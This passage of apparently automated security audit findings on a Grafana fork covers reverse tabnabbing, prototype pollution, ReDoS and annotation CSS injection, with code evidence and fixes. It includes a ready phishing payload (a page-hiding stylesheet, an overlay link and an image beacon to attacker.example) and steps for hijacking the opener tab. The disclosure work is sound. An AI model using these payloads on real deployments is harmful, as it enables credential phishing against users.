   Canvas one-click sink: onElementClick calls `window.open(primaryDataLink.href, primaryDataLink.target ?? '_self')` with no window-features string, so no 'noopener'. oneClickMode is set to Link whenever any configured element link has oneClick === true (642-644); getPrimaryDataLink (904-911) returns that link from this.getLinks, which is getLinksSupplier over this.options.links (667-681) — the Editor-authored element data links. When the Editor also set targetBlank, target is '_blank' and the cross-origin page opened in the new tab keeps a live window.opener to the authenticated Grafana tab.
2. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/ui source packages/grafana-ui/src/components/uPlot/plugins/TooltipPlugin2.tsx (sourcesContent index 755), lines 392-399: on a plain click over the plot while hovering a series and the tooltip is not pinned, the plugin takes `dataLinks = getLinksRef.current(closestSeriesIdx, …)`, finds the link with `oneClick === true`, and executes `window.open(oneClickLink.href, oneClickLink.target ?? '_self')` with no 'noopener'. Otherwise the click pins the tooltip, so with one-click enabled the routine click navigates. This is the one-click path for every uPlot-based panel (timeseries, barchart, candlestick, heatmap, histogram, state-timeline, status-history, trend, xychart).
3. [public/app/features/canvas/runtime/element.tsx:1105](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/canvas/runtime/element.tsx#L1105)
   `onClick={!scene?.isEditingEnabled ? this.onElementClick : undefined}` — the one-click handler is bound only outside edit mode, i.e. exactly in the view mode a Viewer or Admin sees when opening the Editor's dashboard; links are not gated by canExecuteActions (that gate applies to actions only, 645-654).
4. [public/app/plugins/panel/timeseries/TimeSeriesPanel.tsx:185–186](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/TimeSeriesPanel.tsx#L185-L186)
   TimeSeriesPanel passes getDataLinks={(seriesIdx, dataIdx) => alignedFrame.fields[seriesIdx].getLinks?.({ valueRowIndex: dataIdx })} to TooltipPlugin2, so the field's dashboard-configured data links (field.config.links from panel JSON, resolved by getLinksSupplier) are the links the one-click handler hands to window.open.
5. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/data packages/grafana-data/src/field/fieldOverrides.ts getLinksSupplier (sourcesContent index 107, lines 551-590): href is interpolated and passed through locationUtil.processUrl (textUtil.sanitizeUrl — scheme filter only; any http(s) host passes), and `target: link.targetBlank ? '_blank' : undefined`, `oneClick: link.oneClick ?? false` are copied verbatim from the Editor's DataLink config. The Editor therefore controls destination host, new-tab target and one-click behaviour.
6. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Contrast: recovered packages/grafana-ui/src/components/DataLinks/DataLinkButton.tsx (sourcesContent index 417), lines 15-18, renders the same LinkModel as `<a href={link.href} target={link.target} rel="noreferrer">` — rel=noreferrer implies noopener, so the ordinary (non-one-click) rendering of the identical link severs the opener; SpanDetailLinkButtons.tsx:317 likewise uses window.open(href, '_blank', 'noopener,noreferrer'). Only the two one-click window.open sinks omit it.

## Impact
Cross-origin opener access lets the attacker page navigate the victim's authenticated Grafana tab to an attacker-chosen URL at a time of its choosing (credential phishing against the victim) and post messages to it, but gives no read of Grafana DOM, cookies or data (cross-origin). Integrity of the victim's browsing context is affected at a low level; no direct confidentiality or availability impact on Grafana itself.

## Reproduction steps
1. A user with Editor rights saves a dashboard whose timeseries (or any uPlot-based) or canvas panel has a data link with url=https://attacker.example, 'Open in new tab' (targetBlank) and 'One click' enabled — all ordinary data-link editor options stored in dashboard JSON. Any Viewer or Admin who clicks the series or element in view mode (a routine action that normally pins the tooltip) triggers window.open(href,'_blank') without noopener; the attacker page reads window.opener and sets opener.location to a Grafana look-alike login page. Works under default configuration, needs no race or bypass of a shipped control; the victim must perform one click (UI:ACTIVE).

## Recommended fix
The one-click navigation sinks (canvas runtime element.tsx:989 and @grafana/ui TooltipPlugin2.tsx:398) call window.open(href, target) with no 'noopener' feature, so a cross-origin destination opened in a new tab keeps a reference to the authenticated Grafana window, unlike every other rendering of the same LinkModel (DataLinkButton rel=noreferrer, SpanDetailLinkButtons noopener,noreferrer). Fix criteria: Every one-click data-link navigation to a new tab must sever the opener (window.open(href, '_blank', 'noopener,noreferrer') or an equivalent anchor with rel=noopener noreferrer), in both the canvas runtime and TooltipPlugin2, consistent with DataLinkButton and SpanDetailLinkButtons. Verify by configuring a one-click, new-tab data link to an external page and confirming window.opener is null in the opened document for a canvas element and for a timeseries panel.

---
**Severity:** LOW
**Status:** Open
**Category:** Reverse tabnabbing
**CWE:** [CWE-1022](https://cwe.mitre.org/data/definitions/1022.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256350

---

# Service-graph node map writes to Object.prototype via __proto__ service name label

## Details
The Tempo datasource's service-graph transform (`mapPromMetricsToServiceMap` in graphTransform.ts, shipped in data/plugins-bundled/tempo/module.js) accumulates nodes and edges in plain `{}` objects (`nodesMap`, `edgesMap`) keyed by the `server`/`client` label values (optionally prefixed with `*_service_namespace`) of the Prometheus response, and decides between create and update by the truthiness of the lookup:

```
if (!nodesMap[serverId]) { nodesMap[serverId] = {...} }
else { nodesMap[serverId][stat] = (nodesMap[serverId][stat] || 0) + row[valueName]; }
```

and in `collectIsInstrumented`:

```
if (nodesMap[serverId] && nodesMap[serverId].isInstrumented !== true)
  nodesMap[serverId].isInstrumented = row.connection_type === '' || row.connection_type === 'messaging_system';
```

For the string `__proto__`, `nodesMap['__proto__']` resolves to `Object.prototype`, which is truthy, so the update branch runs and writes `total`, `seconds` and/or `failed` (numbers from the metric value column) and `isInstrumented` (boolean) as enumerable properties on `Object.prototype` of the whole Grafana page. The edges map is reached the same way when `${clientId}_${serverId}` equals `__proto__` (e.g. client=`__proto`, server=`_`). There is no `hasOwnProperty` check, `Object.create(null)` or `Map`, and `Object.keys()` in `convertToDataFrames` skips the inherited key so nothing surfaces as an error.

Data flow to the sink: `serviceMapQuery()` (datasource.ts) sends `sum by (client, server) (rate(traces_service_graph_request_*[$__range]))` / `group by (client, connection_type, server) (...)` targets with `format: 'table'` to the Prometheus datasource configured as `jsonData.serviceMap.datasourceUid`. The bundled Prometheus plugin's `transformV2` → `transformDFToTable` turns each label name into a string column and copies the raw label value into it; `DataFrameView.get(i)` then exposes those columns as `row.server` / `row.client`. Per docs/sources/datasources/tempo/service-graph.md these label values are generated by the Tempo metrics-generator or Alloy from ingested spans (service names) and written to the Prometheus backend; nothing in Grafana validates them before they are used as object keys.

The attacker controls only which of the fixed property names (`total`, `seconds`, `failed`, `isInstrumented`) are written, with numeric/boolean values, so this is not code execution; it is global prototype pollution of the viewer's SPA (threat-model adversary 4, datasource-returned labels rendered for every user) that makes those names appear on every object (visible to `in`, `for…in`, and truthiness checks such as `if (x.total)`), corrupting the service graph itself (every node inherits `isInstrumented`) and any host or plugin code that reads those names without own-property checks, until the page is reloaded.

## Evidence
1. [data/plugins-bundled/tempo/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/tempo/module.js.map) (whole file)
   Recovered source ./graphTransform.ts:209-255 collectMetricData() (the .map is one physical line; whole file cited). serverId/clientId are taken verbatim from the Prometheus table rows (row.server, row.client, row.*_service_namespace) and used as keys of the plain `{}` nodesMap/edgesMap. `if (!nodesMap[serverId])` is false for serverId === '__proto__' because the lookup resolves to Object.prototype, so the update branch `nodesMap[serverId][stat] = (nodesMap[serverId][stat] || 0) + row[valueName]` assigns `total`/`seconds`/`failed` onto Object.prototype. edgesMap is reached the same way when `${clientId}_${serverId}` equals '__proto__' (client='__proto', server='_'). Primary fix location.
2. [data/plugins-bundled/tempo/module.js:3](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/tempo/module.js#L3)
   Shipped minified form of the same code, loaded by default as the bundled Tempo datasource: `a[s]?a[s][t]=(a[s][t]||0)+o[i]:a[s]={name:o.server,...}` (collectMetricData) and `t[n]&&!0!==t[n].isInstrumented&&(t[n].isInstrumented=""===a.connection_type||"messaging_system"===a.connection_type)` (collectIsInstrumented). No hasOwnProperty / Object.create(null) / Map guard exists.
3. [data/plugins-bundled/tempo/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/tempo/module.js.map) (whole file)
   Recovered source ./graphTransform.ts:258-271 collectIsInstrumented(): `if (nodesMap[serverId] && nodesMap[serverId].isInstrumented !== true) nodesMap[serverId].isInstrumented = ...` — with serverId === '__proto__' this sets Object.prototype.isInstrumented to a boolean derived from the response's connection_type label.
4. [data/plugins-bundled/tempo/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/tempo/module.js.map) (whole file)
   Recovered source ./datasource.ts:494-519 and 905-935: when the Tempo datasource has jsonData.serviceMap.datasourceUid set and a target has queryType 'serviceMap' (groupBy at datasource.ts:345), serviceMapQuery() calls getDataSourceSrv().get(datasourceUid).query(makePromServiceMapRequest(...)) and hands the unfiltered responses to mapPromMetricsToServiceMap(). makePromServiceMapRequest (datasource.ts:1339-1381) issues `sum by (client, server[, *_service_namespace]) (rate(traces_service_graph_request_*...))` and `group by (client, connection_type, server...)` targets with format:'table', instant:true and refId = metric name, so the `Value #<metric>` column name matches valueName and the label values become row.server/row.client.
5. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   Recovered source: the bundled Prometheus datasource's datasource.ts applies transformV2() to every query response (import at line 57, call at line 500); for targets with format:'table', transformDFToTable() in result_transformer.ts creates one string field per label NAME (`client`, `server`, `connection_type`, ...) and pushes the raw label VALUE via getLabelValue(labels, name), plus `Value #${refId}` when more than one refId is present. A label value of `__proto__` is therefore delivered verbatim as the cell of the `server` column.
6. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/data packages/grafana-data/src/dataframe/DataFrameView.ts: the constructor defines an enumerable getter per field name returning `field.values[this.index]`, and get(idx) returns that object, so `row.server` in collectMetricData is exactly the raw string from the Prometheus `server` column.

## Impact
Attacker-triggered writes land on Object.prototype of the viewer's Grafana page, altering behaviour of all code in that origin; but only the fixed names total/seconds/failed/isInstrumented with numeric/boolean values can be set, so integrity loss is limited (no code execution, no persistence shown). Enumerable prototype properties break for…in-based logic and truthiness checks in the host and other plugins and corrupt the rendered service graph until reload (availability, low). No data disclosure.

## Reproduction steps
1. The attacker is the upstream of the service-graph Prometheus datasource (a compromised/malicious datasource or network path, or — assuming Tempo's metrics-generator derives client/server from span service.name as its docs describe — any workload able to emit traces into the pipeline), who makes a series with server="__proto__" appear. Any Grafana user who then views a dashboard panel or Explore query of type serviceMap on a Tempo datasource with serviceMap.datasourceUid configured runs collectMetricData/collectIsInstrumented in their browser and Object.prototype is written. No Grafana privilege is needed by the attacker; the victim only views the panel. Requires the non-default serviceMap datasource configuration (AT:P).

## Recommended fix
collectMetricData/collectIsInstrumented in graphTransform.ts index plain objects with untrusted label strings and use truthiness of the lookup to decide between create and update, so inherited keys such as `__proto__`/`constructor` are treated as existing entries and written through to Object.prototype. Fix criteria: nodesMap/edgesMap must not be able to resolve or write inherited properties: use Map or Object.create(null) containers (or own-property checks before every read/write) so that a Prometheus response with server/client/namespace labels equal to `__proto__`, `constructor`, `prototype` or any combination producing those edge ids leaves Object.prototype unchanged (`({}).total === undefined` after rendering) and is rendered as an ordinary node/edge.

---
**Severity:** LOW
**Status:** Open
**Category:** Prototype pollution
**CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256349

---

# Loki plugin variable-placeholder regexes are quadratic on query text from Explore URL or dashboard

## Details
The bundled Loki datasource frontend (data/plugins-bundled/loki/module.js, source recovered from module.js.map) carries its own copy of Grafana's template-variable regex in `querybuilder/parsingUtils.ts:31`. Unlike core (`public/app/features/variables/utils.ts:32`, `\[\[(\w+?)...\]\]`), the plugin's `variableRegex` uses `\[\[([\s\S]+?)(?::(\w+))?\]\]`. A single global `String.replace` over an n-byte expression made of repeated `[[` with no `]]` tries every `[[` position as a start, and at each one the lazy `[\s\S]+?` is extended character by character to the end of the string before the alternative fails, so the scan costs about n^2/2 regex steps. The companion `returnVariables()` regex `/__V_(\d)__(.+?)__V__.../g` is quadratic in the same way on repeated `__V_0__`, and `getString()` applies it to every node substring while parsing.

Two traced routes deliver attacker-chosen LogQL text to these functions:

1. Explore link (unauthenticated attacker -> any logged-in user with Explore access). The `panes` URL parameter is JSON-parsed and each pane's `queries` array is copied verbatim into Explore state (`useStateSync/migrators/v1.ts:33,106`, `synchronizer/init.ts:43-50`); Explore's QueryEditorRows mount the Loki plugin's `LokiQueryEditor`, which always renders `QueryPatternsModal`, whose `useMemo` calls `buildVisualQueryFromString(query.expr)` -> `replaceVariables(expr)` on first render regardless of whether the modal is open. Opening the link blocks the tab's main thread for ~n^2/2 steps (100 KB of `[[` -> ~5e9 steps, tens of seconds; larger inputs proportionally longer) and the same work recurs on Builder-mode switch and the Explain view. The accepted request-line length bounds n on this route: Grafana's Go server accepts up to its 1 MB header limit when exposed directly, while a restrictive reverse proxy (e.g. nginx's 8 KB default) reduces the reachable n to a sub-second hang.

2. Dashboard (Editor -> every Viewer). `datasource.addAdHocFilters()` (datasource.ts:1159-1177) calls `replaceVariables()` and `returnVariables()` on each query execution whenever ad-hoc filters are present; it is reached from `applyTemplateVariables()` (DatasourceWithBackend query path) and `interpolateVariablesInQueries()`. An Editor saves a Loki panel whose `expr` is the crafted string together with an ad-hoc filter variable (with a default filter) bound to the Loki datasource; every Viewer who opens the dashboard hangs on `applyTemplateVariables`, with no URL-length constraint on the stored expression.

No length limit or complexity guard exists on either route; lezer parsing happens after `replaceVariables` and is not the bottleneck. A third route the plugin exposes, `tracking.ts:104-106` `variableRegex.test(query.expr)` on DashboardLoadedEvent, is not relied on here because no publisher of that event with dashboard queries could be located in this checkout's core source. The same regexes appear in the bundled Prometheus plugin (`packages/grafana-prometheus/src/querybuilder/parsingUtils.ts:33,75`), tracked separately as lead-module-flow-e698.

Assumptions: browser RegExp engines execute this pattern with a backtracking matcher (V8 Irregexp, SpiderMonkey, JavaScriptCore); V8's experimental linear-time fallback on excessive backtracks is off by default and, where enabled, would reduce the cost.

## Evidence
1. [data/plugins-bundled/loki/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/loki/module.js.map) (whole file)
   Recovered source ./querybuilder/parsingUtils.ts:31 defines `variableRegex = /\$(\w+)|\[\[([\s\S]+?)(?::(\w+))?\]\]|\${(\w+)...}/g`. The `[[` alternative uses an unbounded lazy `[\s\S]+?` that can only be closed by `]]`; for every `[[` opener in an input with no later `]]` the backtracking engine extends the lazy loop one character at a time to end-of-string before failing, so one global `expr.replace(variableRegex, ...)` in `replaceVariables()` (lines 38-56) costs O(n^2) on an n-byte expression of repeated `[[`. `returnVariables()` (lines 68-72) has the same shape, `/__V_(\d)__(.+?)__V__(?:__F__(\w+)__F__)?/g`, quadratic on repeated `__V_0__` with no `__V__`; `getString()` (lines 80-85) applies it to every syntax-node substring. This is the code the fix must change.
2. [data/plugins-bundled/loki/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/loki/module.js.map) (whole file)
   ./querybuilder/parsing.ts:92-94 `buildVisualQueryFromString(expr)` calls `replaceVariables(expr)` on the whole LogQL expression before lezer parsing and then `getString()` -> `returnVariables()` per node; it is the entry point used by QueryPatternsModal, LokiQueryEditor.onEditorModeChange, LokiQueryBuilderContainer and LokiQueryBuilderExplained.
3. [data/plugins-bundled/loki/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/loki/module.js.map) (whole file)
   ./querybuilder/components/QueryPatternsModal.tsx:54-57 computes `useMemo(() => buildVisualQueryFromString(query.expr).query.operations.length > 0, [query.expr])` in the component body, so it runs on first render even while `isOpen` is false; ./components/LokiQueryEditor.tsx:128-136 renders `<QueryPatternsModal query={query} .../>` unconditionally, and ./components/LokiQueryEditorByApp.tsx routes every app except CloudAlerting to LokiQueryEditor. Mounting the Loki query editor in Explore (or the panel editor) with a URL-supplied `expr` therefore executes the quadratic regex over the attacker-chosen expression without any user interaction beyond opening the page.
4. [public/app/features/explore/hooks/useStateSync/migrators/v1.ts:106](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/migrators/v1.ts#L106)
   The Explore `panes` URL parameter is `JSON.parse`d (line 33) and each pane's `queries` array, including each query's `expr`, is copied verbatim into the parsed URL state with no length or content check.
5. [public/app/features/explore/hooks/useStateSync/synchronizer/init.ts:43–50](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/synchronizer/init.ts#L43-L50)
   On Explore initialisation the URL state's `queries` (only refIds de-duplicated by `withUniqueRefIds`) become the pane's queries, which Explore's QueryRows -> QueryEditorRows -> QueryEditorRow render through the datasource plugin's QueryEditor (LokiQueryEditorByApp for a Loki datasource). This is the link from an attacker-crafted `/explore?panes=...` URL to the regex sink.
6. [data/plugins-bundled/loki/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/loki/module.js.map) (whole file)
   ./datasource.ts:1159-1177 `addAdHocFilters()` runs `replaceVariables(queryExpr)` (line 1164) and `returnVariables(expr)` (line 1176) on every query execution whenever `adhocFilters` is non-empty; it is called from `applyTemplateVariables()` (lines 1213-1216, used by DatasourceWithBackend for each backend query) and `interpolateVariablesInQueries()` (lines 480-483). A dashboard whose Loki panel carries the crafted `expr` together with an ad-hoc filter variable (with a default filter) bound to the Loki datasource therefore runs the quadratic regexes in every Viewer's browser on each query run, with no editor UI open and no URL-length bound.
7. [public/app/features/variables/utils.ts:32](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/variables/utils.ts#L32)
   Core's template-variable regex, from which the plugin comment says the copy was taken, bounds the `[[...]]` capture with `(\w+?)`, which fails immediately on a non-word character and is linear. The plugin's copy widened it to `([\s\S]+?)`, introducing the super-linear behaviour; core templateSrv.replace on the same string is unaffected.
8. [data/plugins-bundled/loki/module.js](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/loki/module.js) (whole file)
   The shipped minified bundle (offsets ~61400 and ~61761) contains both regexes verbatim, confirming the recovered source matches the artifact Grafana loads for every Loki datasource.

## Impact
The regex runs synchronously on the browser main thread; the victim's Grafana tab becomes unresponsive for tens of seconds to minutes and re-triggers on each render or query run of the same URL/dashboard. No data is disclosed or modified and the server is unaffected, so availability impact is limited to the victim's session (LOW).

## Reproduction steps
1. Attacker crafts a LogQL expression consisting of hundreds of KB of `[[` (or `__V_0__`) with no terminator. Delivery A: an Explore link (`/explore?panes=...` or a short URL) selecting a Loki datasource; the victim is any logged-in user with Explore access who opens it, and the editor's always-on QueryPatternsModal useMemo runs replaceVariables on mount. Delivery B: an Editor saves the expression in a dashboard panel together with an ad-hoc filter variable bound to the datasource; every Viewer's query run calls addAdHocFilters. Requires a configured Loki datasource (AT:PRESENT); no security mechanism must be defeated.

## Recommended fix
1. querybuilder/parsingUtils.ts `variableRegex` admits an unbounded lazy `[\s\S]+?` between `[[` and `]]`, and `returnVariables` uses an unbounded lazy `(.+?)` before `__V__`; with the global flag over attacker-controlled query text both scan to end-of-string for every opener, giving quadratic time. Fix criteria: Variable-placeholder matching and restoration must run in time linear in the expression length for any input. Verify: parsing an expression of 300 KB of `[[` (and one of repeated `__V_0__`) through buildVisualQueryFromString and addAdHocFilters completes in milliseconds, e.g. by bounding the capture to `\w+?` as core does and making the placeholder grammar non-overlapping.
2. LokiQueryEditor renders QueryPatternsModal unconditionally and the modal eagerly parses `query.expr` on every render even when closed, so URL-supplied query text is parsed before the user interacts. Fix criteria: Expression parsing for the patterns modal should not run until the modal is opened (or should be bounded by an input-size check), so that merely loading an Explore URL does not execute parsing over an arbitrarily long attacker-supplied expression.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256348

---

# Annotation tooltip renders annotation HTML with DOMPurify html profile, allowing document-wide <style> CSS injection

## Details
Annotation markers on the time series, candlestick, heatmap, state timeline and status history panels open a tooltip whose body renders the annotation's `title` and `text` as HTML: `dangerouslySetInnerHTML={{ __html: textUtil.sanitize(text) }}` (AnnotationTooltipBody.tsx:20-21; also via AnnotationTooltipCluster.tsx:76 for clustered markers). textUtil.sanitize is not the Text-panel xss whitelist but DOMPurify with the html profile (recovered sanitize.ts:61-80: USE_PROFILES {html:true}, FORBID_TAGS form/input, ADD_ATTR target; it ignores disable_sanitize_html). The bundled DOMPurify 3.4.13 html profile keeps the `style` element and `style` attribute (recovered purify.es.mjs:299 and :313), `img src`, `a href target` (rel=noopener is added) and `button`; iframes, script, event handlers and javascript: URLs are removed.

Because the tooltip is portaled into the page (AnnotationMarker.tsx:171-179 -> getPortalContainer() = #grafana-portal-container or document.body), a `<style>` element inside annotation text is mounted as a document-level stylesheet: its selectors match every element in the Grafana SPA, not just the tooltip. The maintainers' sanctioned sanitizer for Editor HTML, sanitizeTextPanelContent (recovered xss/lib/default.js whitelist: no `style` tag; cssfilter default whitelist: position, z-index, top, left, content, visibility, opacity all false), deliberately withholds unscoped stylesheets and positioning CSS from Editors; this path grants them.

Sources: (a) the Grafana annotation API - the Editor basic role holds fixed:annotations:writer (Viewer only fixed:annotations:reader), the annotation editor in this unit (AnnotationEditor.tsx TextArea 'description') and the HTTP API accept arbitrary text, and the -- Grafana -- datasource (grafana/datasource.ts:199-257) returns the stored text/title as a frame; (b) any datasource annotation query: standardAnnotationSupport.ts getAnnotationsFromData (178-278) maps result columns text/title into events and AnnotationsPlugin.getVals (54-63) copies them into the tooltip, so a compromised datasource (adversary 4) or an Editor controlling query results controls the HTML without annotation-write permission; (c) alert-state annotations from the ruler (title suppressed only when alert evalMatches text exists, getAnnotationTooltip.tsx:46).

Attack: annotation text `<style>#reactRoot *{visibility:hidden} body::after{content:'Session expired - sign in at https://grafana-sso.example';visibility:visible;position:fixed;inset:0;background:#111;color:#fff;font-size:2em} [data-testid=annotation-marker]{transform:none!important}</style><a href="https://attacker.example/login" style="position:fixed;inset:0;display:block;z-index:2147483647"></a><img src="https://attacker.example/b">`. Any Viewer, Editor or Admin who hovers or focuses the marker (AnnotationMarker.tsx:164-167) has their whole Grafana page restyled in their authenticated origin: UI redress/hiding, fake banners, phishing overlays, presence beacons and attribute-selector url() leakage. CSP is off by default (conf/defaults.ini:542) and the shipped template allows style-src 'unsafe-inline' and img-src *. Clicking the marker pins the tooltip, making the stylesheet persistent. No script runs, so impact is CSS/HTML-level only.

Sibling: sanitizedsvg-inline-style-css-injection records the same class for the SVG profile in canvas icons; this is a different sanitizer path (html profile), sink (annotation tooltip) and source (annotation events), reachable by hover on five panel types.

Assumptions (dependencies not in checkout, read from source maps): DOMPurify 3.4.13 as bundled keeps style/img/a under USE_PROFILES {html:true}; React 19.2.8 mounts dangerouslySetInnerHTML content including <style> elements; @grafana/ui getPortalContainer returns a body-level container.

## Evidence
1. [public/app/plugins/panel/timeseries/plugins/annotations/AnnotationTooltipBody.tsx:20–21](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/annotations/AnnotationTooltipBody.tsx#L20-L21)
   title and text of the hovered annotation are rendered with dangerouslySetInnerHTML after textUtil.sanitize(). The recovered sanitizer (public/build/6540.a30454ce5fbe65a84f5f.js.map, packages/grafana-data/src/text/sanitize.ts:61-80) is DOMPurify.sanitize(str, {USE_PROFILES:{html:true}, FORBID_TAGS:['form','input'], ADD_ATTR:['target']}) and does not honour config.disableSanitizeHtml. The bundled DOMPurify 3.4.13 html profile (public/build/7606.e8e4d98948a4bb1cf3bc.js.map purify.es.mjs:299 tags, :313 attributes) keeps the <style> element and the style attribute, plus <a href>, <img src> and <button>; only a <style> containing element children is dropped (purify.es.mjs:1568). A <style> block mounted here is an ordinary document stylesheet whose selectors apply to the whole Grafana page, not to the tooltip. This is the code the fix must change.
2. [public/app/plugins/panel/timeseries/plugins/annotations/AnnotationTooltipCluster.tsx:52–76](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/annotations/AnnotationTooltipCluster.tsx#L52-L76)
   The clustered-annotation tooltip renders every annotation of the cluster through the same AnnotationTooltipBody with raw text/title (lines 52-54 read annoVals.text/title, line 76 renders), so clustering does not reduce exposure.
3. [public/app/plugins/panel/timeseries/plugins/annotations/getAnnotationTooltip.tsx:33–46](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/annotations/getAnnotationTooltip.tsx#L33-L46)
   text (line 34) and title (line 46) are taken verbatim from the annotation frame values (annoVals.text/title) with no further processing before they reach the body component; title is only suppressed when alert evalMatches text exists.
4. [public/app/plugins/panel/timeseries/plugins/annotations/AnnotationMarker.tsx:164–179](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/annotations/AnnotationMarker.tsx#L164-L179)
   The marker shows the tooltip on mouse enter/focus (onMouseEnter/onFocus -> setIsHovering(true), lines 164-167) and portals it (createPortal, lines 171-179) to portalRoot, which AnnotationsPlugin obtains from @grafana/ui getPortalContainer() = document.getElementById('grafana-portal-container') ?? document.body (recovered Portal.tsx:49-50). Merely hovering a marker mounts the annotation HTML into the document; a click pins it (line 166) so the stylesheet persists.
5. [public/app/plugins/panel/timeseries/plugins/AnnotationsPlugin.tsx:54–62](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/AnnotationsPlugin.tsx#L54-L62)
   getVals copies every annotation frame field by name into annoVals, so the text/title columns of any annotation frame (Grafana annotation API via the -- Grafana -- datasource, or any datasource annotation query) become the tooltip content. The same plugin is mounted by the timeseries (TimeSeriesPanel.tsx:228), candlestick (:319), heatmap (HeatmapPanel.tsx:255), state-timeline (:171) and status-history (:192) panels, each passing data.annotations.
6. [public/app/features/annotations/standardAnnotationSupport.ts:178–278](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/annotations/standardAnnotationSupport.ts#L178-L278)
   getAnnotationsFromData maps datasource result columns named text/title (or Editor-chosen mappings) straight into AnnotationEvent.text/title (anno[f.key] = v, lines 242-268) with no escaping, so a datasource (adversary 4), or an Editor pointing an annotation query at any datasource whose results they shape, controls the HTML without annotation-write permission.

## Impact
